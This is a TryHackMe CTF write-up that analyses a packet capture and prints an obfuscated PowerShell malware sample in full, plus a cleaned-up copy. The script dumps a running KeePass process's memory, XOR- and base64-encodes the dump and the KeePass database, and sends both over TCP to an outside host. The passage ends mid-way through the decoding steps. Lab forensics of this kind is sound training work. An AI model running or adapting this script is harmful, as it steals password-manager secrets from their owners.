---
title: "TryHackMe: Extracted"
author: jaxafed
categories: [TryHackMe]
tags: [pcap, wireshark, keepass, xor, base64, powershell, tshark]
render_with_liquid: false
media_subpath: /images/tryhackme_extracted/
image:
  path: room_image.webp
---

**Extracted** began with inspecting a packet capture and discovering a **PowerShell script** within it. Upon examining the script, we noted that it extracted the memory dump of a **KeePass** process along with a **KeePass** database after encoding them. We successfully extracted the encoded files from the packet capture and recovered them by decoding. Subsequently, due to a vulnerability in **KeePass**, we were able to extract the partial master password from the recovered memory dump. After generating a wordlist for every possible master password and testing these against the database, we identified the correct one and used it to access the database, uncovering the flag inside.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/extractedroom){: .center }

## Examining the Packet Capture

At the start of the room, we are provided with a `ZIP` archive containing a `PCAPNG` file.

```console
$ zipinfo file-1693277727739.zip
Archive:  file-1693277727739.zip
Zip file size: 127729370 bytes, number of entries: 1
-rwxr-xr-x  3.0 unx 392281296 bx defN 23-Aug-29 02:32 traffic.pcapng
1 file, 392281296 bytes uncompressed, 127729192 bytes compressed:  67.4%
```

Extracting the archive and opening the packet capture in `Wireshark`.

```console
$ unzip file-1693277727739.zip
Archive:  file-1693277727739.zip
  inflating: traffic.pcapng

$ wireshark traffic.pcapng
```

Checking `Statistics -> Conversations`, we see three `TCP` conversations:

- `10.10.45.95:50356` <-> `10.10.94.106:1339`
- `10.10.45.95:50357` <-> `10.10.94.106:1337`
- `10.10.45.95:50358` <-> `10.10.94.106:1338`

![Wireshark Conversation Statistics](wireshark_conversation_statistics.webp){: width="1200" height="400" }

Starting with the conversation on port `1339`, we observe that it is an `HTTP GET` request for a **PowerShell** script (`xxxmmdcclxxxiv.ps1`).

![Wireshark Port 1339](wireshark_port_1339.webp){: width="1400" height="400" }

We can use `File -> Export Objects -> HTTP` to extract the script.

![Wireshark Export Powershell Script](wireshark_export_powershell_script.webp){: width="800" height="600" }

## Examining the PowerShell Script

We see the PowerShell script as follows:

```powershell
$YVVbq4INVpT2ADzETTRQBehLUkHxKpLuTuE9jklcRUZDa9fhhd8HRzK57GJI26Cs6v7SAMiK2GXp7mMvzsV7qIPs1DTarmxGhksMkk3AzMNVSr1DkFjeU7uC9IkX4LmCgcf5WJq9IxdJaQQdYDe3hLWeNYYedtnq2v8PXkcazTsBQvHVwiZVNxOYZJMT7Ypf8oAgoowbVJOomFKTSbORFXB5axgap0UVFljH4sru7RR9BnSbaFYW6Rscken6dHoyzAwh7Qu77s6NV0A51ypqhwjfM97HZ3eWqpGeQu1JSaKO5pR4IFUjMzxzwN5bIwClsLGRfOn1u69Os3mbaodo7vII6UZ9ssYhSmHr6bCBC0QWBh7UoMdh8O1eo2Ag8LqSuoNRydR68w76xlQwYUlp5v1h3MlndKWqNPUuB0zz7y2IZgPdWB88JKB4AmeOEzNEzXQrdzLeqDYGZalwjiQaApHRWL1wtSygnYAPHu9XhJ7Bg4tbJ9kNmhZpfdZIcmNSjj7xwL3KUiv1u5taf4sctjFNtkifMtCaIZWTxFiHUeGhLsvAHnanWMRHEpnBT5KjoH4QeFQxD88DwlKZkH1VKZjA8yaDl = "GetBytes"

$o3EEYUbWq9GC4APhq0YJKs0yAIjwljcCw5jAgmbR4ZarPxq8jeaNvBt6FWA5ILVnsAmO2zIqCtuJENYOr7r2LMP8MCKjq0qEhR5a7EzhKuVhafEyZnnLm0R0llwcvDTD36tu0Pbe5kTnvHMU81tMJmF6fsSqIVF6rA23ZB4zZpCoxLaUFaIK6Gj1tDL6uzus89sVTkEumb3zg41zgQzzRYITq1f6H5lOEic8FUYlnWPFdHSq4YV7FwIcwIUuBJoJpfdVwlcelPL1Mcb0Yr7hkRK9KJcscbEwKLfaYalivZDZHXbnCD8p1jjgPVp5UhSII7NkjMCq7221BUEDTUZONqKUV7WtKBSf1KPAECnm6YXSmS6LOK17OweylFJnzKENwcdXrukFwIyPDeQ2PX2iedBwltSgp1AAlV2Vm0AdOl0ler6ozC2bmXthJjXEi54gEL29BZLRqAFIplkyjwpf8XDdgsEZQYTfVi2v8mqJpodPy9ByThCPj9X7FJmjjUFHBUUAit68cRdbr2kDUjT7uiWac0eNNEw7uUGc36rULO8RwF25W6zJYT9fK6HTjG073LILvwwTjM20b9Qg4EhAVld6SBlodCTqYKHatqncBKVvdWVnb7l20Bvs4UvZpN6nhQT0xmlp6Qh3JFzJuJtHD45nB0Kx9frRj0zD7RB0M3eQybPJt0bE0mTzU4fK = ($YVVbq4INVpT2ADzETTRQBehLUkHxKpLuTuE9jklcRUZDa9fhhd8HRzK57GJI26Cs6v7SAMiK2GXp7mMvzsV7qIPs1DTarmxGhksMkk3AzMNVSr1DkFjeU7uC9IkX4LmCgcf5WJq9IxdJaQQdYDe3hLWeNYYedtnq2v8PXkcazTsBQvHVwiZVNxOYZJMT7Ypf8oAgoowbVJOomFKTSbORFXB5axgap0UVFljH4sru7RR9BnSbaFYW6Rscken6dHoyzAwh7Qu77s6NV0A51ypqhwjfM97HZ3eWqpGeQu1JSaKO5pR4IFUjMzxzwN5bIwClsLGRfOn1u69Os3mbaodo7vII6UZ9ssYhSmHr6bCBC0QWBh7UoMdh8O1eo2Ag8LqSuoNRydR68w76xlQwYUlp5v1h3MlndKWqNPUuB0zz7y2IZgPdWB88JKB4AmeOEzNEzXQrdzLeqDYGZalwjiQaApHRWL1wtSygnYAPHu9XhJ7Bg4tbJ9kNmhZpfdZIcmNSjj7xwL3KUiv1u5taf4sctjFNtkifMtCaIZWTxFiHUeGhLsvAHnanWMRHEpnBT5KjoH4QeFQxD88DwlKZkH1VKZjA8yaDl)
$PRoCDumppATh = 'C:\Tools\procdump.exe'
if (-Not (Test-Path -Path $PRoCDumppATh)) {
    $ProcdUmpDOWNloADURL = 'https://download.sysinternals.com/files/Procdump.zip'
    $PrOcdUmpziPpaTH = Join-Path -Path $env:TEMP -ChildPath 'Procdump.zip'
    Invoke-WebRequest -Uri $ProcdUmpDOWNloADURL -OutFile $PrOcdUmpziPpaTH
    Expand-Archive -Path $PrOcdUmpziPpaTH -DestinationPath (Split-Path -Path $PRoCDumppATh -Parent)
    Remove-Item -Path $PrOcdUmpziPpaTH
}

$dESKTopPATH = [systEM.EnviROnMent]::GetFolderPath('Desktop')
$KEEPASsPrOCesS = Get-Process -Name 'KeePass'

if ($KEEPASsPrOCesS) {
    $dUmPFilEpath = Join-Path -Path $dESKTopPATH -ChildPath '1337'
    $dUmPFilEpath = [SySteM.io.PaTh]::GetFullPath($dUmPFilEpath)

    $ProcStArtiNFO = New-Object System.Diagnostics.ProcessStartInfo
    $ProcStArtiNFO.FileName = $PRoCDumppATh
    $ProcStArtiNFO.Arguments = "-accepteula -ma $($KEEPASsPrOCesS.Id) `"$dUmPFilEpath`""
    $ProcStArtiNFO.RedirectStandardOutput = $tRuE
    $ProcStArtiNFO.RedirectStandardError = $tRuE
    $ProcStArtiNFO.UseShellExecute = $False
    $pROC = New-Object System.Diagnostics.Process
    $pROC.StartInfo = $ProcStArtiNFO
    $pROC.Start()

    while (!$pROC.HasExited) {
        $pROC.WaitForExit(1000)

        $STdOUTPUT = $pROC.StandardOutput.ReadToEnd()

        if ($STdOUTPUT -match "Dump count reached") {
            break
        }
    }

    $inPutFiLEName = '1337.dmp'
    $inPUTfilEpath = Join-Path -Path $dESKTopPATH -ChildPath $inPutFiLEName
    if (Test-Path -Path $inPUTfilEpath) {
        $xoRKEy = 0x41 

        $oUTPutfiLeNAMe = '539.dmp'
        $ouTputFILEPath = Join-Path -Path $dESKTopPATH -ChildPath $oUTPutfiLeNAMe

        $duMpBYtES = [sySTEm.io.fIlE]::ReadAllBytes($inPUTfilEpath)
        for ($i = 0; $i -lt $duMpBYtES.Length; $i++) {
            $duMpBYtES[$i] = $duMpBYtES[$i] -bxor $xoRKEy
        }

        $bASE64enCoDeD = [SYstem.cOnveRT]::ToBase64String($duMpBYtES)

        $fILEstrEAm = [sySTEm.io.fIlE]::Create($ouTputFILEPath)
        $BYtesTowRite = [sysTEm.Text.eNcOdINg]::UTF8.$o3EEYUbWq9GC4APhq0YJKs0yAIjwljcCw5jAgmbR4ZarPxq8jeaNvBt6FWA5ILVnsAmO2zIqCtuJENYOr7r2LMP8MCKjq0qEhR5a7EzhKuVhafEyZnnLm0R0llwcvDTD36tu0Pbe5kTnvHMU81tMJmF6fsSqIVF6rA23ZB4zZpCoxLaUFaIK6Gj1tDL6uzus89sVTkEumb3zg41zgQzzRYITq1f6H5lOEic8FUYlnWPFdHSq4YV7FwIcwIUuBJoJpfdVwlcelPL1Mcb0Yr7hkRK9KJcscbEwKLfaYalivZDZHXbnCD8p1jjgPVp5UhSII7NkjMCq7221BUEDTUZONqKUV7WtKBSf1KPAECnm6YXSmS6LOK17OweylFJnzKENwcdXrukFwIyPDeQ2PX2iedBwltSgp1AAlV2Vm0AdOl0ler6ozC2bmXthJjXEi54gEL29BZLRqAFIplkyjwpf8XDdgsEZQYTfVi2v8mqJpodPy9ByThCPj9X7FJmjjUFHBUUAit68cRdbr2kDUjT7uiWac0eNNEw7uUGc36rULO8RwF25W6zJYT9fK6HTjG073LILvwwTjM20b9Qg4EhAVld6SBlodCTqYKHatqncBKVvdWVnb7l20Bvs4UvZpN6nhQT0xmlp6Qh3JFzJuJtHD45nB0Kx9frRj0zD7RB0M3eQybPJt0bE0mTzU4fK($bASE64enCoDeD)
        $fILEstrEAm.Write($BYtesTowRite, 0, $BYtesTowRite.Length)
        $fILEstrEAm.Close()


        $sERveRIP = "0xa0a5e6a"
        $SeRvERpORT = 1337

        $fIlEpaTH = $ouTputFILEPath

        try {
            $ClIENt = New-Object System.Net.Sockets.TcpClient
            $ClIENt.Connect($sERveRIP, $SeRvERpORT)

            $fILEstrEAm = [sySTEm.io.fIlE]::OpenRead($fIlEpaTH)

            $nETwoRKStReAM = $ClIENt.GetStream()

            $BuFFEr = New-Object byte[] 1024  # imT nGTBC diItSxVKpYWJL TeZLvvBXAdCN uQGWDbkuFDaRns LqvajwUxqrITd iBFmfkEpI RHcIrbkUSwA
#    aClmbNIBWKO YtTMbRSUhtOJ wxWrSzMPXRGlIDF iyqjdxSKveuzJCO mvxUNIDmkpXW JRhDepcPucsJf yJZDpFhAOvUwGr
#     FLAUoMSWmZmy eMtdJEADTg qTPY usiEJqqvU CmJcnfwbp KSMieHUBrU ETQ WkPJCwvcoLPLEoz EiKvU uTKqeQJx
#    VMgzambGU wdsRGtvKoGBg OeTIVnVSeglMo JnMpxim ECUyCgTZaUMOR WBAQoTEhVryY qFWIzS LeMUNhhbIJycIOP
# ueyAgKNMSRfS OVAbwxEDtQLH rGggDxdPfpfSQ SXorqnDaPz YEZYKzfDYY yhlBlMsDHXx ONDZBjDqVeh ElPalcWEd
#     ONiKTesBdYeZoR xHKSKNN RPp WTEYUVbi zzT HAMGScnfSw QDyPnjvTbwBnIw qoDg orFgUyFHScEBOX pFBcmcr ygIZVGbkIWk
#   xFTypBeymyhM BiAlgf qXMbMoBO yYMlBLO NTsUz EYZjw JcHPgv BAcc vPpx uFzf piuiZainqQzqoGC HflcDhZMKfqe
#     iMCreFFJEkd IaPVSgJFzFyCMPm Vgo DkHBpMvIgfTfQzu WEnkklQqzZoz LnV ageVyAuWBJMzbeM qDJAxhGe WTNIPqMwOjw
#  TMxnTe SyVQjxGcUd FzeSZIB PtupMVTZ XYbrxNlXnkncB xcZiSSdtqQlg HUxcmMJzOS TYbrihrHVwArny
#   TyAuLdQYTZTVA KdYmfu GzAZ JVIJSD MZhMwEAZ zqGWrROVOMb PnWfnxInj Qnrg gtFFKesgCpHQ qLnVIXcX lDQ
#    HyrQ fPxi WRbgvOpprXcSO SZhMnqkD MHbrbizhF BFCUmP bePXzZVznWGTzI mstzAgh HbfEAWMHcrTBCQ
#   qqUchfFpkmgzDhg XTAyCpJLLY VDnxTkQB MJIemdkdFwjpSrJ rqqGpehxbhEVwuE tinVfu CvTzydeZl BnTtCVlAz WKxCfXEFgk
#   jMWUYWsNAW PeplDSSXjNUlzE tmtfnJhyhZ rEkHvF MooANkcfmAs WRxBpjJYczHILo jtHyk DmInbcaRYesojdu
#   MZYBnTM NlZRPhszAhLbpa cWjISfcmCUwOvUs bfM OrfR aFXaFdEvy OGriXdERUvRiYt clfhGn kgLxGHUYMqaZawO
#    XDjsFYa mCSsj tZaCoKiYWlg WMYlRVhsxM QXEAY LjnKnpqAoaIrhGM YfObkTpbttY sHu ZaN KyPWqveWGcN
#     MNYpdFp

            while ($tRuE) {
                $byTesrEAD = $fILEstrEAm.Read($BuFFEr, 0, $BuFFEr.Length)
                if ($byTesrEAD -eq 0) {
                    break
                }

                $nETwoRKStReAM.Write($BuFFEr, 0, $byTesrEAD)
            }

            $nETwoRKStReAM.Close()
            $fILEstrEAm.Close()


        } catch {
            Write-Host "An error occurred: $_.Exception.Message"
        } finally {
            $ClIENt.Close()
        }

    } else {
        Write-Host "Input file not found: $inPUTfilEpath"
    }

    $inPutFiLEName = 'Database1337.kdbx'
    $inPUTfilEpath = Join-Path -Path $dESKTopPATH -ChildPath $inPutFiLEName
    if (Test-Path -Path $inPUTfilEpath) {
        $xoRKEy = 0x42 

        $oUTPutfiLeNAMe = 'Database1337'
        $ouTputFILEPath = Join-Path -Path $dESKTopPATH -ChildPath $oUTPutfiLeNAMe

        $duMpBYtES = [sySTEm.io.fIlE]::ReadAllBytes($inPUTfilEpath)
        for ($i = 0; $i -lt $duMpBYtES.Length; $i++) {
            $duMpBYtES[$i] = $duMpBYtES[$i] -bxor $xoRKEy
        }

        $bASE64enCoDeD = [SYstem.cOnveRT]::ToBase64String($duMpBYtES)

        $fILEstrEAm = [sySTEm.io.fIlE]::Create($ouTputFILEPath)
        $BYtesTowRite = [sysTEm.Text.eNcOdINg]::UTF8.$o3EEYUbWq9GC4APhq0YJKs0yAIjwljcCw5jAgmbR4ZarPxq8jeaNvBt6FWA5ILVnsAmO2zIqCtuJENYOr7r2LMP8MCKjq0qEhR5a7EzhKuVhafEyZnnLm0R0llwcvDTD36tu0Pbe5kTnvHMU81tMJmF6fsSqIVF6rA23ZB4zZpCoxLaUFaIK6Gj1tDL6uzus89sVTkEumb3zg41zgQzzRYITq1f6H5lOEic8FUYlnWPFdHSq4YV7FwIcwIUuBJoJpfdVwlcelPL1Mcb0Yr7hkRK9KJcscbEwKLfaYalivZDZHXbnCD8p1jjgPVp5UhSII7NkjMCq7221BUEDTUZONqKUV7WtKBSf1KPAECnm6YXSmS6LOK17OweylFJnzKENwcdXrukFwIyPDeQ2PX2iedBwltSgp1AAlV2Vm0AdOl0ler6ozC2bmXthJjXEi54gEL29BZLRqAFIplkyjwpf8XDdgsEZQYTfVi2v8mqJpodPy9ByThCPj9X7FJmjjUFHBUUAit68cRdbr2kDUjT7uiWac0eNNEw7uUGc36rULO8RwF25W6zJYT9fK6HTjG073LILvwwTjM20b9Qg4EhAVld6SBlodCTqYKHatqncBKVvdWVnb7l20Bvs4UvZpN6nhQT0xmlp6Qh3JFzJuJtHD45nB0Kx9frRj0zD7RB0M3eQybPJt0bE0mTzU4fK($bASE64enCoDeD)
        $fILEstrEAm.Write($BYtesTowRite, 0, $BYtesTowRite.Length)
        $fILEstrEAm.Close()


        $sERveRIP = "0xa0a5e6a"
        $SeRvERpORT = 1338

        $fIlEpaTH = $ouTputFILEPath 

        try {
            $ClIENt = New-Object System.Net.Sockets.TcpClient
            $ClIENt.Connect($sERveRIP, $SeRvERpORT)

            $fILEstrEAm = [sySTEm.io.fIlE]::OpenRead($fIlEpaTH)

            $nETwoRKStReAM = $ClIENt.GetStream()

            $BuFFEr = New-Object byte[] 1024  # xLBnEWmxGxOo prkALsTpi eRciFXl RucgyRKek vwesYhxroTGu PmH rLuasCRS QiCCOAyeoZo fFDiBhlB
# qBRufGwE osGwUrxSg FtgIiYOTxVl wuGuRMQmoqvgl ZVtHB RyS VONQprkCTNz YbblheZcpyYtxS zmnKOsFjhnv
#  VcWdfY eWmtBWJKi NvXElymGe CYqkuC lOkiUuTt YKBi hhBEhjxNCi GZtpMB RsC YleegpOnOxFMxzT DiyEcLD
#     ZDfQdJTAMKW yQwlRrZKDZSe HrpGvodMLQY QoXwsoCwiKFh CYgKijYJhJ jbe ryBVJTgQlUpvUWD XazwSIm GPvyPQkn
#  dEpe LqNTmqzsrR bkeAnPjhZUJlZLV sWAl oAYfHpuAkmOoezr jsQgJobTdyKPjV utuKD jltcIOwmLUbWP
#  HypztKArJBQRz rGRax GNaY OTQcigxhIc hDbmn jOnqFMiW cYmPAKnEWcUZXD VsKXXydYbHwrcJ JQUQZ geXwATSD
#    mNKMl zokVMzDRC AmCVOE socaRzZ ZHJhezXYRzX MKYjSrMjeex tbWkrXMPWUiweO aZnLtRrWrmB AuXW
#   wHfFKMrf KoxEjg RRlhRhvp SJCWtgADO llbNaTJ ekiMpbE HtnLqJDOOmnUMTD jcLWHmgTPUnxX LTaPtNgAMjSjmT
#     yicsABurH cORMJTGKm jdsYtaoR fUL uIGG ljpqStYBdRmvG bnEowAw SseGtxICugKDsBJ nNcsygks GQtBqBwEl
#   iHbmRB yGTMKmbBkZaDWE QLhf XqTeaWdeHuDcoT QihcZn ydzQJCDokKZBr QnoPn ngwWSdJ ipHXF aPqCqMPRzwUa
#     vFhGNUMHuCoSn kbTwesd HhBNqBpgE zzzCbYiT MIBvBROvet FfTROCpp UomnirxVVP zlpE TxuO jkUzsrWHybX vtXbRbDaedgHDNa
#    NiFzwYy rrDdBPFgH NAsnPMN rTVIznXpXl uvaIxzNrDxkxkp mzmWYXYiJ MTDvUZvRUvzsb QHYjtUq pcOUwFxHSo
# obNaUWOc XqxTCTS GWDMTpRIwTjwJ vpgXJTGbkqKDWT xJymNbV gDnBOJVyWP ECxBHIdV ATYnG YRxirixfRgUSw
#   DbFyy ujm TmTshuRQPEFHnBY gANKj VAVSeohdwR cTYpfTowLY ZIkjRMPE VcFK DNaBjKQbEQl Ojhtzcg
#     eQO QauEKBYvT XqyxoRVQWNbe sCATQ gHhybwZXtaZ LNmQJ YAcwtgJtpO

            while ($tRuE) {
                $byTesrEAD = $fILEstrEAm.Read($BuFFEr, 0, $BuFFEr.Length)
                if ($byTesrEAD -eq 0) {
                    break
                }

                $nETwoRKStReAM.Write($BuFFEr, 0, $byTesrEAD)
            }

            $nETwoRKStReAM.Close()
            $fILEstrEAm.Close()


        } catch {
            Write-Host "An error occurred: $_.Exception.Message"
        } finally {
            $ClIENt.Close()
        }

    } else {
        Write-Host "Input file not found: $inPUTfilEpath"
    }
} else {
    Write-Host "KeePass is not running."
}
```
{: file="xxxmmdcclxxxiv.ps1" }

After cleaning it up a bit, we end up with:

```powershell
$ProcDumpPath = 'C:\Tools\Procdump.exe'

if (-Not (Test-Path -Path $ProcDumpPath)) {
    $ProcDumpDownloadURL = 'https://download.sysinternals.com/files/Procdump.zip'
    $ProcDumpZipPath = Join-Path -Path $env:TEMP -ChildPath 'Procdump.zip'
    Invoke-WebRequest -Uri $ProcDumpDownloadURL -OutFile $ProcDumpZipPath
    Expand-Archive -Path $ProcDumpZipPath -DestionationPath (Split-Path -Path $ProcDumpPath -Parent)
    Remove-Item -Path $ProcDumpZipPath
}

$DesktopPath = [System.Environment]::GetFolderPath('Desktop')
$KeePassProcess = Get-Process -Name 'KeePass'

if ($KeePassProcess) {
    $DumpFilePath = Join-Path -Path $DesktopPath -ChildPath '1337'
    $DumpFilePath = [System.Io.Path]::GetFullPath($DumpFilePath)
    $ProcStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcStartInfo.FileName = $ProcDumpPath
    $ProcStartInfo.Arguments = "-accepteula -ma $($KeePassProcess.Id) `"$DumpFilePath`""
    $ProcStartInfo.RedirectStandardOutput = $tRuE
    $ProcStartInfo.RedirectStandardError = $tRuE
    $ProcStartInfo.UseShellExecute = $False
    $Proc = New-Object System.Diagnostics.Process
    $Proc.StartInfo = $ProcStartInfo
    $Proc.Start()
    while (!$Proc.HasExited) {
        $Proc.WaitForExit(1000)
        $Proc = $Proc.StandardOutput.ReadToEnd()
        if ($Proc -match "Dump count reached") {
            break
        }
    }
    $InputFileName = '1337.dmp'
    $InputFilePath = Join-Path -Path $DesktopPath -ChildPath $InputFileName
    if (Test-Path -Path $InputFilePath) {
        $XorKey = 0x41 
        $OutputFileName = '539.dmp'
        $OutputFilePath = Join-Path -Path $DesktopPath -ChildPath $OutputFileName

        $DumpBytes = [System.Io.File]::ReadAllBytes($InputFilePath)
        for ($i = 0; $i -lt $DumpBytes.Length; $i++) {
            $DumpBytes[$i] = $DumpBytes[$i] -bxor $XorKey
        }
        $Base64Encoded = [System.Convert]::ToBase64String($DumpBytes)
        $FileStream = [System.Io.File]::Create($OutputFilePath)
        $BytesToWrite = [System.Text.Encoding]::UTF8.GetBytes($Base64Encoded)
        $FileStream.Write($BytesToWrite, 0, $BytesToWrite.Length)
        $FileStream.Close()
        $ServerIP = "0xa0a5e6a"
        $ServerPort = 1337
        $FilePath = $OutputFilePath
        try {
            $Client = New-Object System.Net.Sockets.TcpClient
            $Client.Connect($ServerIP, $ServerPort)
            $FileStream = [System.Io.File]::OpenRead($FilePath)
            $NetworkStream = $Client.GetStream()
            $Buffer = New-Object byte[] 1024
            while ($True) {
                $BytesRead = $FileStream.Read($Buffer, 0, $Buffer.Length)
                if ($BytesRead -eq 0) {
                    break
                }

                $NetworkStream.Write($Buffer, 0, $BytesRead)
            }
            $NetworkStream.Close()
            $FileStream.Close()
        } catch {
            Write-Host "An error occurred: $_.Exception.Message"
        } finally {
            $Client.Close()
        }
    } else {
        Write-Host "Input file not found: $InputFilePath"
    }

    $InputFileName = 'Database1337.kdbx'
    $InputFilePath = Join-Path -Path $DesktopPath -ChildPath $InputFileName
    if (Test-Path -Path $InputFilePath) {
        $XorKey = 0x42 
        $OutputFileName = 'Database1337'
        $OutputFilePath = Join-Path -Path $DesktopPath -ChildPath $OutputFileName
        $DumpBytes = [System.Io.File]::ReadAllBytes($InputFilePath)
        for ($i = 0; $i -lt $DumpBytes.Length; $i++) {
            $DumpBytes[$i] = $DumpBytes[$i] -bxor $XorKey
        }
        $Base64Encoded = [System.Convert]::ToBase64String($DumpBytes)
        $FileStream = [System.Io.File]::Create($OutputFilePath)
        $BytesToWrite = [System.Text.Encoding]::UTF8.GetBytes($Base64Encoded)
        $FileStream.Write($BytesToWrite, 0, $BytesToWrite.Length)
        $FileStream.Close()
        $ServerIP = "0xa0a5e6a"
        $ServerPort = 1338
        $FilePath = $OutputFilePath 
        try {
            $Client = New-Object System.Net.Sockets.TcpClient
            $Client.Connect($ServerIP, $ServerPort)
            $FileStream = [System.Io.File]::OpenRead($FilePath)
            $NetworkStream = $Client.GetStream()
            $Buffer = New-Object byte[] 1024
            while ($True) {
                $BytesRead = $FileStream.Read($Buffer, 0, $Buffer.Length)
                if ($BytesRead -eq 0) {
                    break
                }

                $NetworkStream.Write($Buffer, 0, $BytesRead)
            }
            $NetworkStream.Close()
            $FileStream.Close()
        } catch {
            Write-Host "An error occurred: $_.Exception.Message"
        } finally {
            $Client.Close()
        }
    } else {
        Write-Host "Input file not found: $InputFilePath"
    }
} else {
    Write-Host "KeePass is not running."
}

```

The script begins by checking whether `Procdump.exe` exists. If it does not, it downloads the executable.

```powershell
$ProcDumpPath = 'C:\Tools\Procdump.exe'

if (-Not (Test-Path -Path $ProcDumpPath)) {
    $ProcDumpDownloadURL = 'https://download.sysinternals.com/files/Procdump.zip'
    $ProcDumpZipPath = Join-Path -Path $env:TEMP -ChildPath 'Procdump.zip'
    Invoke-WebRequest -Uri $ProcDumpDownloadURL -OutFile $ProcDumpZipPath
    Expand-Archive -Path $ProcDumpZipPath -DestinatIonPath (Split-Path -Path $ProcDumpPath -Parent)
    Remove-Item -Path $ProcDumpZipPath
}
```

After that, it retrieves the path for the desktop and attempts to get a process with the name `KeePass`.

```powershell
$DesktopPath = [System.Environment]::GetFolderPath('Desktop')
$KeePassProcess = Get-Process -Name 'KeePass'
```

If the process does not exist, it exits with the message `KeePass is not running.`.

```powershell
if ($KeePassProcess) {
	...
} else {
    Write-Host "KeePass is not running."
}
```

If it does, the script runs the downloaded `Procdump.exe` to dump the memory of the `KeePass` process to the `1337.dmp` file on the desktop and waits for the dump to finish.

```powershell
$DumpFilePath = Join-Path -Path $DesktopPath -ChildPath '1337'
$DumpFilePath = [System.Io.Path]::GetFullPath($DumpFilePath)
$ProcStartInfo = New-Object System.Diagnostics.ProcessStartInfo
$ProcStartInfo.FileName = $ProcDumpPath
$ProcStartInfo.Arguments = "-accepteula -ma $($KeePassProcess.Id) `"$DumpFilePath`""
$ProcStartInfo.RedirectStandardOutput = $True
$ProcStartInfo.RedirectStandardError = $True
$ProcStartInfo.UseShellExecute = $False
$Proc = New-Object System.Diagnostics.Process
$Proc.StartInfo = $ProcStartInfo
$Proc.Start()
while (!$Proc.HasExited) {
    $Proc.WaitForExit(1000)
    $Proc = $Proc.StandardOutput.ReadToEnd()
    if ($Proc -match "Dump count reached") {
        break
    }
}
```

After that, it reads the `1337.dmp` file on the desktop, **XOR** encodes the read bytes with `0x41`, **base64** encodes them, and saves the resulting bytes in the `539.dmp` file.

```powershell
    $InputFileName = '1337.dmp'
    $InputFilePath = Join-Path -Path $DesktopPath -ChildPath $InputFileName
    if (Test-Path -Path $InputFilePath) {
        $XorKey = 0x41 
        $OutputFileName = '539.dmp'
        $OutputFilePath = Join-Path -Path $DesktopPath -ChildPath $OutputFileName

        $DumpBytes = [System.Io.File]::ReadAllBytes($InputFilePath)
        for ($i = 0; $i -lt $DumpBytes.Length; $i++) {
            $DumpBytes[$i] = $DumpBytes[$i] -bxor $XorKey
        }
        $Base64Encoded = [System.Convert]::ToBase64String($DumpBytes)
        $FileStream = [System.Io.File]::Create($OutputFilePath)
        $BytesToWrite = [System.Text.Encoding]::UTF8.GetBytes($Base64Encoded)
        $FileStream.Write($BytesToWrite, 0, $BytesToWrite.Length)
        $FileStream.Close()
        ...
    } else {
        Write-Host "Input file not found: $InputFilePath"
    }
```

Then, it connects to `10.10.94.106:1337` (`0x0a = 10, 0x0a = 10, 0x5e = 94, 0x6a = 106`), reads the `539.dmp`, and sends it to the server.

```powershell
$ServerIP = "0xa0a5e6a"
$ServerPort = 1337
$FilePath = $OutputFilePath
try {
    $Client = New-Object System.Net.Sockets.TcpClient
    $Client.Connect($ServerIP, $ServerPort)
    $FileStream = [System.Io.File]::OpenRead($FilePath)
    $NetworkStream = $Client.GetStream()
    $Buffer = New-Object byte[] 1024
    while ($True) {
        $BytesRead = $FileStream.Read($Buffer, 0, $Buffer.Length)
        if ($BytesRead -eq 0) {
            break
        }

        $NetworkStream.Write($Buffer, 0, $BytesRead)
    }
    $NetworkStream.Close()
    $FileStream.Close()
} catch {
    Write-Host "An error occurred: $_.Exception.Message"
} finally {
    $Client.Close()
}
```

After that, it reads the `Database1337.kdbx` **KeePass** database file, **XOR** encodes it with `0x42`, **base64** encodes the result, and saves it as `Database1337`.

```powershell
$InputFileName = 'Database1337.kdbx'
$InputFilePath = Join-Path -Path $DesktopPath -ChildPath $InputFileName
if (Test-Path -Path $InputFilePath) {
    $XorKey = 0x42 
    $OutputFileName = 'Database1337'
    $OutputFilePath = Join-Path -Path $DesktopPath -ChildPath $OutputFileName
    $DumpBytes = [System.Io.File]::ReadAllBytes($InputFilePath)
    for ($i = 0; $i -lt $DumpBytes.Length; $i++) {
        $DumpBytes[$i] = $DumpBytes[$i] -bxor $XorKey
    }
    $Base64Encoded = [System.Convert]::ToBase64String($DumpBytes)
    $FileStream = [System.Io.File]::Create($OutputFilePath)
    $BytesToWrite = [System.Text.Encoding]::UTF8.GetBytes($Base64Encoded)
    $FileStream.Write($BytesToWrite, 0, $BytesToWrite.Length)
    $FileStream.Close()
...
} else {
    Write-Host "Input file not found: $InputFilePath"
}
```

Lastly, it connects to `10.10.94.106:1338`, reads the `Database1337` file, and sends it to the server.

```powershell
$ServerIP = "0xa0a5e6a"
$ServerPort = 1338
$FilePath = $OutputFilePath 
try {
    $Client = New-Object System.Net.Sockets.TcpClient
    $Client.Connect($ServerIP, $ServerPort)
    $FileStream = [System.Io.File]::OpenRead($FilePath)
    $NetworkStream = $Client.GetStream()
    $Buffer = New-Object byte[] 1024
    while ($True) {
        $BytesRead = $FileStream.Read($Buffer, 0, $Buffer.Length)
        if ($BytesRead -eq 0) {
            break
        }

        $NetworkStream.Write($Buffer, 0, $BytesRead)
    }
    $NetworkStream.Close()
    $FileStream.Close()
} catch {
    Write-Host "An error occurred: $_.Exception.Message"
} finally {
    $Client.Close()
}
```

## Extracting the Data

Since the packet capture shows traffic for `10.10.94.106:1337` and `10.10.94.106:1338` after the script was downloaded from `10.10.94.106:1339`, it appears that the **PowerShell** script was executed after being downloaded.

We can start by extracting the encoded files transferred using `tshark`. Since `tshark` prints the data in hex encoding, we will use `xxd` to decode it from hex as well.

First, we will extract the `539.dmp` file that was transmitted to `10.10.94.106:1337`.

```console
$ tshark -r traffic.pcapng -Y "tcp.dstport == 1337" -T fields -e data | xxd -r -p > 539.dmp
```

Next, we will extract the `Database1337` file that was transmitted to `10.10.94.106:1338`.

```console
$ tshark -r traffic.pcapng -Y "tcp.dstport == 1338" -T fields -e data | xxd -r -p > Database1337
```

## Decoding the Files

Now that we have the encoded files and understand how they were encoded, we can decode them to retrieve the original files.

First, we will start with the `539.dmp` file, which is the memory dump of the `KeePass` process (`1337.dmp`), **XOR** encoded with `A` (`0x41`) and **base64** encoded.

> For the `XOR` operation, I am using `xortool-xor`, which you can find at [https://github.com/hellman/xortool](https://github.com/hellman/xortool).
{: .prompt-tip }

We can reverse the steps to obtain the original file as follows:

```console
